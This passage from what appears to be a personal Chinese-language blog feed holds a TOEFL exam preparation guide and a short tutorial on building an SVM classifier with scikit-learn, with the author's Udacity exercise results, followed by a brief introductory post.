     |    Good (24–30) Fair (17–23) Limited (1–16) Score of zero (0) |<br>  | Total Score |    0–120        |           Good                       Limited           |</p></li><li><p>考试形式：中国大陆地区现在全部采用机考模式，也就是 iBT TOEFL (internet-based TOEFL Test Exam)</p></li></ul><p>Now，让我们开始逐一回顾下 TOEFL 考试每项具体内容和知识点总结吧。</p><h1 id="二、TOEFL-阅读"><a href="#二、TOEFL-阅读" class="headerlink" title="二、TOEFL 阅读"></a>二、TOEFL 阅读</h1><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h2><p>TOEFL 阅读部分总共有 3 篇文章，每篇 800 词左右，每篇题目量 16/17 题目，时长为 1 h。</p><p>经过很长时间的备考，我愈发觉得 TOEFL 阅读部分着重考察我们的<strong>逻辑思维能力</strong>、<strong>学科词汇</strong>！</p><p>主要涉及学科：艺术、生物、地理、人文…</p><p>✂ <strong>生物</strong>、<strong>地理</strong>等学科理科性比较强，<strong>人文/社会科学</strong>文章比较难理解些</p><h2 id="2-个人经验总结"><a href="#2-个人经验总结" class="headerlink" title="2. 个人经验总结"></a>2. 个人经验总结</h2><ul><li><p>首先，看到 TOEFL 文章后一定要<strong>看标题！看标题！看标题！</strong></p><p>  这样可以根据标题猜测这遍文章的主题/学科，相信大家考试之前已经做了不少题目，艺术/生物/地理/历史等类。</p></li><li><p>其次，TOEFL 阅读正常是按照文章段落顺序出题</p><p>  每题所在段落会高亮标注，开始某段的题目前最好先快速通览整段（开头/结尾，中心句，跳读例子等次要部分）。</p></li><li><p>最后，做阅读题目时刻牢记主题思想，注意前后逻辑、行为思路。</p></li></ul><hr><p><strong><em>题型拆解</em></strong></p><ul><li><p>词汇题(3-4 个/篇)：词汇题都是固定词汇反复考，经常是某个单词这回是选项，下次就变成了题干。尽量保证全对 ✔ ✔ ✔</p></li><li><p>细节题(2-4 个/篇)：注意 Except / Not 等信号词</p></li><li><p>推断题(2-4 个/篇)：一般都是取同（与文章意思相同）、取反（与文章意思相反） </p></li><li><p>句子简化题(1 个/篇)：三少（主语/宾语/逻辑），一多（逻辑）</p></li><li><p>句子插入题(1 个/篇)：这个主要根据前后主语，指代词（this/that/these/those）、逻辑关系词（therefore/because）等前后逻辑结构选出。</p></li><li><p>Prose Summary / Table ：2分题，Prose Summary 是给出6个句子让你选出与文章对应的main ideas / key points，略过 details / examples；table 表格题一般在对比型文章容易出现，对比俩种类型的区别，对号入座就可以了。</p></li></ul><p>🔗 常见逻辑关系总结：因果逻辑（therefore/because/thus/due to）、对比逻辑（contrast/while）、比较逻辑(compare/similar)、递进逻辑（in addition/furthermore）…</p><h1 id="三、TOEFL-听力"><a href="#三、TOEFL-听力" class="headerlink" title="三、TOEFL 听力"></a>三、TOEFL 听力</h1><h2 id="1-介绍-1"><a href="#1-介绍-1" class="headerlink" title="1. 介绍"></a>1. 介绍</h2><p>听力可以说 TOEFL 考试的核心、重点、要害（俗话说：得托福听力者，得高分），因为除了阅读部分，剩下 3 个 部分（听力、口语、写作的综合写作）全部和听力相关且直接影响着做题质量，可以关乎你的 TOEFL 最终成绩。</p><p>TOEFL 听力部分总共有 2 个 section，每个 section 是 1 篇对话，2 篇 lecture—</p><table><thead><tr><th>Section 1</th><th>Section 2</th></tr></thead><tbody><tr><td>Conversation 1</td><td>Conversation 2</td></tr><tr><td>Lecture 1</td><td>Lecture 3</td></tr><tr><td>Lecture 2</td><td>Lecture 4</td></tr></tbody></table><p>TOEFL 听力部分着重考察我们的<strong>听力能力</strong>、<strong>学科词汇</strong>！</p><p>无老师就建议大家，在没有听懂95%以上内容的情况下，不要做笔记，这点我自己深有体会；刚开始忙于做笔记，为了做笔记而做笔记，却忽略 😭 了听力的核心 Σ 是要听懂！要听懂！要听懂！</p><p>主要涉及学科：Arts/Life Science/Geography/Astronomy/Scoial Science…</p><h2 id="2-个人经验总结-1"><a href="#2-个人经验总结-1" class="headerlink" title="2. 个人经验总结"></a>2. 个人经验总结</h2><ul><li><p>先说下 conversation。</p><ul><li><p>conversation 一般多发生于以下场景和人群之间：① 学习场景：Prof. &amp; Stu./Advisor &amp; Stu./ Stu. &amp; Stu. ② 生活场景：Librian &amp; Stu.等。</p></li><li><p>主要任务：mainly topic(subject discussion/ paper/ part-time jobs/ urgent matters)， speaker`s attitudes， analysis of problems(one speaker)， solutions(solved/unsovled)。</p></li><li><p>笔记：建议 conversation 不做笔记。抓主要信息，听懂就好。</p></li></ul></li><li><p>接下来重头戏 lectures。</p><ul><li><p>lecture 主要分为两种：monologue or discussion</p></li><li><p>主要信息如下表：</p><p>|        分类         |         备注         |<br>| ——————  | —————— |<br>|       开头           |       主旨       |<br>|       结尾           |       重听题、预测  |<br>|      人名、地名      |        一般不考具体含义，但做题出现关键词要有印象，一般是在历史发展过程/多种类型对比出现          |<br>|      强调1           |    并列（and/also）       |<br>|      强调2           |    转折（however/while）       |<br>|      强调3           |    重点（important/especially）       |<br>|      强调4           |    重复（几个adj 并列重复某个概念）       |<br>|      强调5           |    对比/比较（though/felt，虚拟语气的一种形式，表示过去认为A，现在实际B）<br>|      指令词          |       listen/think     |</p><blockquote><p>这里特别感谢江苏南京朗阁 TOEFL 听力林幸健老师，原表是林老师总结的，林老师建议我们记住此表，听力考试具体听时做到心里有数，主次分明，听出<strong>层次感</strong>、<strong>颗粒感</strong>（practice tests perfect ！）</p></blockquote></li></ul></li></ul><h1 id="四、TOEFL-口语"><a href="#四、TOEFL-口语" class="headerlink" title="四、TOEFL 口语"></a>四、TOEFL 口语</h1><h2 id="1-介绍-2"><a href="#1-介绍-2" class="headerlink" title="1. 介绍"></a>1. 介绍</h2><pre><code>TOEFL 口语部分总共有 6 个 task（除了1、2，剩下的 task 都有听力部分）。* task 1-2：开放性回答，都是日常生活常见的话题 e.g ① 谈论一本你喜欢的书以及喜欢的理由、具体例子 ② 说一位你个你崇拜的人，说明理由、细节；二选一：① 你喜欢去市中心超时郊区的超市购物 ③ 你喜欢和哪一种室友相处：A or B or C?    **答题**：15s prepare + 45s speak* task 3-4：考试三部分组成：Reading + Listening + Speaking     * task 3：校园（campus）场景，一般发生在俩个学生之间。reading 要求我们阅读完材料听一段 conversation；conversation 中俩个学生谈论阅读材料中的 topic ，学生 A 会明确表明态度（agree / disagree），另一个学生 B 辅助谈话中，学生 A 依次说出自己的理由1、2；speaking 总结阅读材料主题 + 学术的态度以及理由1、2。        &gt; 📌 task 3 阅读材料一般可分为：#letter #announcement #proposal    * task 4：学术（academic）场景，一般是教授一个的 monologue，reading 要我们在阅读完材料（某个学科中的概念介绍 e.g swarm intelligence/ emotional intelligence/ plants...）；listening 中教授会用 1-2 例子向学术 illustrate 这个概念；speaking 中我们要总结 reading 中的概念大意，然后概述教授所说的具体例子（examples）。    **答题**：30s prepare + 60s speak * task 5-6：考试三部分组成：Listening + Speaking     * task 5：校园（campus）场景，listening 听一段学生对话，有 1 个 problem + 2 个 solutions + 对应的理由1、2（两个版本）；speaking 部分我们需要总结一下学生遇到的 problem ，选择一个 solution，并总结理由1、2（听力！听力！听力！）。        &gt; 📌 task 5 可分为：紧急情况、忘记某事/某物     * task 6：学术（academic）场景，listening 部分先听一段学术 monologue，包含 1 个 topic + 3 个 main points + 3 个例子（1个 main point &lt;-&gt; 1 个 example）；speaking 部分我们总结下听力材料中的 1 个 topic + 3 个 main points + 3 个例子。    **答题**：20s prepare + 60s speak    主要涉及场景、学科：campus service/psychology/biology/botany/animals...</code></pre><h1 id="五、TOEFL-写作"><a href="#五、TOEFL-写作" class="headerlink" title="五、TOEFL 写作"></a>五、TOEFL 写作</h1><h2 id="1-介绍-3"><a href="#1-介绍-3" class="headerlink" title="1. 介绍"></a>1. 介绍</h2><p>TOEFL 写作部分总共有 2 个部分：integrated writing + independent writing。</p><ul><li><p>综合写作（intergrated writing）：reading + listening + writing 。reading 阅读一篇短文，阐述某个 topic sentence，接下来三段阐述 3 个论据和细节；listening 一般都是反驳文章观点，然后说出 3 个 论据和细节；writing 部分我们需要总结对比 reading 观点和 listening 观点（不漏写！不漏写！不漏写！）。</p><ul><li><p>reading：阅读时间先抓首段，找出核心事件/观点，然后分别快速阅读剩下 3 段的首句和细节，抓名词，形容词，注意并列结构。</p></li><li><p>listening：一般 speaker 都会用一些<strong>声调</strong>、<strong>语气</strong>来帮我们辨别核心驳论点和细节，用心听，多感受 ~</p></li><li><p><strong>时间</strong>：20min</p></li></ul></li><li><p>独立写作（independent writing）：</p><ul><li><p>话题：工作、教育、环保、科技、政府…</p></li><li><p>注意：每段中要有 details 和 examples</p></li><li><p><strong>时间</strong>：30min</p></li></ul></li></ul><p>✂ 很多小伙伴把重心完全放到了 independent writing，却忽视了 integrated writing 的重要性（很大程度上，你的 integrated 能否上 fair 甚至 good 直接影响着我们写作部分的最终得分）</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上就是全部的考试主要内容和考点以及一些应试策略，仅供大家参考，大家要记住，TOEFL 毕竟是一场考试，有其局限性。我们真正着眼点还是应该放到提升自己英语能力上：听的懂，说得出，写得好（我个人总结的9字箴言）</p><blockquote><p>经过几个月的备考，祝愿自己这次能考出理想成绩，早日拿到 1 跟油条，2 个鸭蛋（100/120 分）</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Cover Photo by ETS.org&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;后天（2017.10.28）我就要参加 TOEFL（ETS）考试了，我想在考试之前系统梳理下 TOEFL 考试流程、内容、一些应试“策略”（我这里不愿称之为技巧）~ OK，那我们正是开始吧！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;一、介绍&quot;&gt;&lt;a href=&quot;#一、介绍&quot; class=&quot;headerlink&quot; title=&quot;一、介绍&quot;&gt;&lt;/a&gt;一、介绍&lt;/h1&gt;&lt;p&gt;TOEFL 考试全称为 Test of English as a Foreign Language，中文我们习惯称之为“托福”，举办方是美国重要考试机构 ETS（English Testing System），TOEFL是很多想要出国去英语国家留学、工作必不可少；此外，现在很多人还把 TOEFL 和 IELTS 当成介于 CET-4 、CET-6 和 专业英语等级考试（一般俗称的专四、专八）的一种语言能力证明考试，面试外企或对英语要求高的专业。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;报名要求：无要求&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;考试时长： 大陆考区是每周的周六 9：00 开考（ETS有时会根据情况在某个周六的下午增加一场 TOEFL 考试），持续时间一般都是3个小时以上，&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="考试" scheme="https://github.com/zhililab/categories/%E8%80%83%E8%AF%95/"/>
    
    
      <category term="英语" scheme="https://github.com/zhililab/tags/%E8%8B%B1%E8%AF%AD/"/>
    
      <category term="TOEFL" scheme="https://github.com/zhililab/tags/TOEFL/"/>
    
  </entry>
  
  <entry>
    <title>机器学习算法之【SVM】</title>
    <link href="https://github.com/zhililab/2017/10/24/MachineLearning-SupervisedLearning-SVM/"/>
    <id>https://github.com/zhililab/2017/10/24/MachineLearning-SupervisedLearning-SVM/</id>
    <published>2017-10-24T14:00:00.000Z</published>
    <updated>2018-06-04T05:05:40.758Z</updated>
    
    <content type="html"><![CDATA[<p>Cover Photo by scikit-learn.org</p><blockquote><p>导语：前天，手欠误删了基于 Github Pages + Hexo 搭建的个人技术博客，已经花费了2小时写了篇 SVM 算法总结，没了 T_T ( ´･･)ﾉ(._.`) 吸取这次的教训，做好数据/文档的备份操作 ！！！但是，换个角度想想，这也给我一个再次抛开书本、博客文档（当时的短时记忆加个人理解写成），再次思考什么 SVM，SVM到底说了啥，如何利用scikit-learn 快速构建一个基于 SVM 分类器/模型的机会哦 ~ 我必须谢谢我自己 🤣🤣🤣</p></blockquote><h3 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h3><p>众所周知，机器学习我们一般可以分为两大类：一是监督学习或有监督学习（Supervised Learning），另一类是自主学习或无监督学习（Unsupervised Learning）。今天，我想回顾一下或者说温习下上周学习的一种有监督学习算法 SVM。</p><p>SVM 是英文 Support Vector Machines 的英文所写，翻译成中文，我们一般称之为支持向量机。利用 SVM 我们可以实现对线性空间场景下（非线性空间下，我们可以利用 kernel tricks 进行改造，后面会详细以及）分类问题，具体举例来说，可以尝试用 SVM 解决下列问题：</p><a id="more"></a><ul><li>垃圾邮件分类</li><li>作者预测</li><li>个性化推荐 （好友推荐、音乐推荐、商品推荐）</li><li>…</li></ul><h3 id="二、核心思想"><a href="#二、核心思想" class="headerlink" title="二、核心思想"></a>二、核心思想</h3><p>SVM 核心思想是一个超平面内，找到一条直线，实现对不同类型的点进行分类的目的，且边界距离Margin达到最大值。需要注意的是，现实世界中的问题是复杂多变、多种多样，有时我们在处理分类问题遇到非典型线性分类问题，要么采用其他分类算法，要么对问题进行“改造”，把实际工程应用中具体的非线性问题转换成线性或类线性问题。</p><p>所以，在具体工程应用中，我们可能还会见到一些 SVM 的变体模型，这里我在后面如若遇到也会总结、分享 ~</p><blockquote><p>我们想要达到掌握/精通一门语言、技术的程度，不是一朝一夕能够达到的，相反的，我们不如边用边学（遇到需要使用这门技术的时候，开始按需学习、实践、反复）、边学边用（阅读GitHub源代码，是一种非常好的快速学习一门语言/技术的方法）。逆行思维，多想想自己已经 了解/理解/掌握 哪些知识/技术/工具</p></blockquote><h3 id="三、具体实例"><a href="#三、具体实例" class="headerlink" title="三、具体实例"></a>三、具体实例</h3><ol><li><p>为什么选择 scikit-learn</p><p> scikit-learn 是当下入门机器学习几乎都会用到的机器学习集成包，主要基于Python编写的。文档齐全、社区友好、支持当下几乎所有主流的机器学习算法、框架；上手快，易于实现（个人感觉 scikit-learn 有点类似深度学习中 keras 框架，基本构建模型都已经封装好，“搭积木”的方式你主要调用/组合就好了）。</p><p> ☀ 当然了，我们在享受 scikit-learn 快捷便利强大的同时，也不能过于依赖。防止自己的编程能力 keep your hands dirty，还要关注大公司（BAT，FLAG）发布新的开源包/框架（我自己一直关注微博上 “爱可可-爱生活”的微博号）</p></li></ol><ol><li><p>利用 scikit-learn 快速构建一个基于 SVM 的分类器/模型</p><p> 下面，我们看下如何使用 scikit-learn 快速搭建起一个基于 SVM 的分类器</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入sklearn相关算法包，以及自己编写的数据预处理程序</span></span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"><span class="keyword">from</span> prep_data <span class="keyword">import</span> makeTerrainData</span><br><span class="line"></span><br><span class="line"><span class="comment">#数据预处理：训练集 + 测试机</span></span><br><span class="line">features_train, features_test, labels_train, labels_test = makeTerrianData()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成实例</span></span><br><span class="line">clf = SVC(kernel=<span class="string">'linear'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拟合分类器</span></span><br><span class="line">clf.fit(features_train, labels_train)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行预测</span></span><br><span class="line">pred = clf.predict(features_test)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准确率</span></span><br><span class="line">accuracy = accuracy_score(pred, labels_test)</span><br></pre></td></tr></table></figure><p> 看到了吧 o(<em>^＠^</em>)o 使用 scikit-learn 构建一个基于 SVM 的分类器就是这么容易，给 scikit-learn 手动点赞吧 👍 b(￣▽￣)d</p></li><li><p>调参</p><blockquote><p>有些人会说调参，占据机器学习的大部分时间，虽然有些夸张，但却也反映出了调参对于机器学习模型好坏、质量的重要性</p></blockquote><ul><li><p>kernel：rbf(default) / linear/ sigmoid … 我们称之为 kernel trick ，非常好用。我们前面提到在分类问题非线性情况是，我们需要转换成类线性或线性问题，这里 kernel 主要起这个作用哈 ~~~ 吼吼吼 💃</p></li><li><p>C：一般来说，C 值越大，拟合程度越高</p></li><li><p>gamma：gamma 参数相比 C 参数对模型的拟合影响程度小很多，但还是存在一定影响的。根据经验值，我们得出，一般gamma </p><p>下面是 Udacity SVM 算法部分的 Mini 小项目，我的运行主要结果 </p><p>练习1：作者身份准确率<br>no. of Chris training emails: 7936<br>no. of Sara training emails: 7884<br>accuracy: 0.984072810011</p><p>练习2：对SVM分类器计时<br>training time: 321.045 s<br>predicting time: 28.493 s</p><p>练习3：降低训练集大小 （100% -&gt; 1%）<br>training time: 0.139 s<br>training time: 1.551 s<br>accuracy: 0.884527872582</p><p>练习4：改变内核（100% -&gt; 1%，linear -&gt; rbf）<br>training time: 0.153 s<br>training time: 1.783 s<br>accuracy: 0.616040955631</p><p>练习5：优化C参数（100% -&gt; 1%，C: 10.0、100.、1000. 和 10000.）<br>0.616040955631 -&gt; 0.616040955631 -&gt;  0.821387940842 -&gt;  0.892491467577</p><p>练习6：改变内核（linear -&gt; rbf, C: 10000）<br>training time: 158.059 s<br>training time: 15.595 s<br>accuracy:  0.990898748578</p></li></ul></li></ol><h3 id="四、SVM-的-pros-and-cons"><a href="#四、SVM-的-pros-and-cons" class="headerlink" title="四、SVM 的 pros and cons"></a>四、SVM 的 pros and cons</h3><p>Pros：</p><ul><li>适合处理线性分类问题</li><li>robust</li></ul><p>Cons：</p><ul><li>防止过度拟合问题，上文提及的 C 参数和 gamma 参数需要调整优化</li><li>优化问题比较复杂</li><li>对噪声敏感</li></ul><p>注：这里pros and cons 参考了 Udacity 夏季线下讨论营的 SVM 优缺点总结</p><h3 id="五、思考"><a href="#五、思考" class="headerlink" title="五、思考"></a>五、思考</h3><ol><li><p>我们该怎样学习机器学习（个人见解）</p><p> 记得周志华老师在他的“西瓜书”🍉——《机器学习》的前言如何使用本书就明确表示，希望读者，不要指望一下俩下掌握机器学习，建立读者不妨多读几遍该书，每次收获获取都不同；此外，周老师不建议初学者，上来就一头扎进“十大经典算法” 或 “二十大算法”，沉迷于某个算法的数学推导、代码实现等，“只见其木，不见其林”。我个人十分赞同周志华老师的观点。</p><p> 1）机器学习好比一大片森林，初来乍到，我们最好观其全貌，概览机器学习主要内容和知识体系；</p><p> 2）边学边思考，多实践、多总结。Andrew Ng 说过—— 人人都可以掌握机器学期、深度学习，关键要掌握掌握其的方法，很多人就忽视复现他们实验这个常见但经常被大家忽略的快速学习机器学习/深度学习的高效学习方法。</p></li></ol><ol><li>我接下来的学习计划和蓝图（仅供参考）<ol><li>参加 Kaggle / 天池 数据科学竞赛，实战中学习，学习中实战；</li><li>多写机器学习或数据分析技术、方法等博客，不断回顾学习，深化知识理解，朝着掌握/精通的方向不断努力</li><li>强化编程能力。不过度依赖 scikit-learn 等算法包</li></ol><ul><li>Be open-minded ! </li><li>Be proactive !</li><li>…</li></ul></li></ol><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><blockquote><p>关于我的博文的几点说明：</p></blockquote><ul><li>我的博文主要是个人随笔、技术总结分享、数据科学/机器学习项目踩坑经验以及一些杂七杂八的内容，作为自己的一个小天地 ~</li><li>我的博文内容更多强调自己的个人理解和思考，而非知识、技能的提纲，合上书本、各种资料后，写出来的东西才是自己的东西，行文逻辑也将是你自己的思维过程，以及你意识中觉得比较重要的地方。这样相当于“一千个读者，就有一千个哈姆雷特一样”。</li><li>技术总结博客很多都是初学札记，难免有疏漏或理解错误的地方，恳请阅者多多包涵，但如果我的一点个人理解或思考能给你带来一点儿启发或进一步思考，我将会十分高兴的，说明我写的博客帮助提升自己的同时，也帮助到了TA人。</li></ul><p>砥砺前行，不忘初心 ，一直在路上 ε=ε=ε=(~￣▽￣)~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Cover Photo by scikit-learn.org&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;导语：前天，手欠误删了基于 Github Pages + Hexo 搭建的个人技术博客，已经花费了2小时写了篇 SVM 算法总结，没了 T_T ( ´･･)ﾉ(._.`) 吸取这次的教训，做好数据/文档的备份操作 ！！！但是，换个角度想想，这也给我一个再次抛开书本、博客文档（当时的短时记忆加个人理解写成），再次思考什么 SVM，SVM到底说了啥，如何利用scikit-learn 快速构建一个基于 SVM 分类器/模型的机会哦 ~ 我必须谢谢我自己 🤣🤣🤣&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;一、介绍&quot;&gt;&lt;a href=&quot;#一、介绍&quot; class=&quot;headerlink&quot; title=&quot;一、介绍&quot;&gt;&lt;/a&gt;一、介绍&lt;/h3&gt;&lt;p&gt;众所周知，机器学习我们一般可以分为两大类：一是监督学习或有监督学习（Supervised Learning），另一类是自主学习或无监督学习（Unsupervised Learning）。今天，我想回顾一下或者说温习下上周学习的一种有监督学习算法 SVM。&lt;/p&gt;
&lt;p&gt;SVM 是英文 Support Vector Machines 的英文所写，翻译成中文，我们一般称之为支持向量机。利用 SVM 我们可以实现对线性空间场景下（非线性空间下，我们可以利用 kernel tricks 进行改造，后面会详细以及）分类问题，具体举例来说，可以尝试用 SVM 解决下列问题：&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="https://github.com/zhililab/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="机器学习" scheme="https://github.com/zhililab/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>HelloWorld</title>
    <link href="https://github.com/zhililab/2017/10/20/HelloWorld/"/>
    <id>https://github.com/zhililab/2017/10/20/HelloWorld/</id>
    <published>2017-10-20T02:10:10.000Z</published>
    <updated>2018-03-20T07:09:46.931Z</updated>
    
    <content type="html"><![CDATA[<p>Photo by Vladislav Klapin on Unsplash</p><h1 id="开篇之作"><a href="#开篇之作" class="headerlink" title="开篇之作"></a>开篇之作</h1><p>今天我终于迈出了开始自己博客撰写的第一步。想想昨天自己花费了大半天时间，一直专注于博客工具的构建（zhi-li.github.io），却忘了写博客的本质 ———— 督促自己进行深度思考，打破自己以往只读、只读，没有思考的弊端，希望从现在开始，从每一篇小文章、小随笔写字。记录下自己思考的过程，产生灵感、想法；创造自己的独到的见解、看法。少点输入（控制输入数量、质量）、多点输出（深化思考）。</p><p>接下来，我的博客写作主要内容包括：个人随笔、技术学习总结与思考、考试总结等等…之前写的文章也会陆续上传的哦;)</p><p>未完待续 …</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Photo by Vladislav Klapin on Unsplash&lt;/p&gt;
&lt;h1 id=&quot;开篇之作&quot;&gt;&lt;a href=&quot;#开篇之作&quot; class=&quot;headerlink&quot; title=&quot;开篇之作&quot;&gt;&lt;/a&gt;开篇之作&lt;/h1&gt;&lt;p&gt;今天我终于迈出了开始自己博客撰写的
      
    
    </summary>
    
      <category term="随笔" scheme="https://github.com/zhililab/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="https://github.com/zhililab/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
